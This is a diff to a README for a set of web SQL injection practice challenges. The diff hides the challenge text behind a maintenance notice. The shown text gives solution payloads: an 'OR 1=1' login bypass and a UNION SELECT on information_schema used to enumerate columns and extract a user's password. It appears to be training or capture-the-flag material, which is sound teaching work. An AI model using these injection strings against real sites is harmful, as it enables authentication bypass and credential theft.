@@ -1,5 +1,7 @@
 # WEB - SQLi Challenges
 
+## Website down for maintenance.
+<!---
 # Challenge 1 - Try to login
 	+ main file used = login1.php
 	+ solution: anything' OR 1=1 -- //
@@ -37,4 +39,4 @@
 		+ you would've obtained the table names from the previous challenge 
 		+ ' UNION SELECT column_name, null, null, null, null FROM information_schema.columns -- // will help you get the column names
 		+ then execute the query stated in 'solution' and extract the password of the person corresponding to id = 5
-
+--->
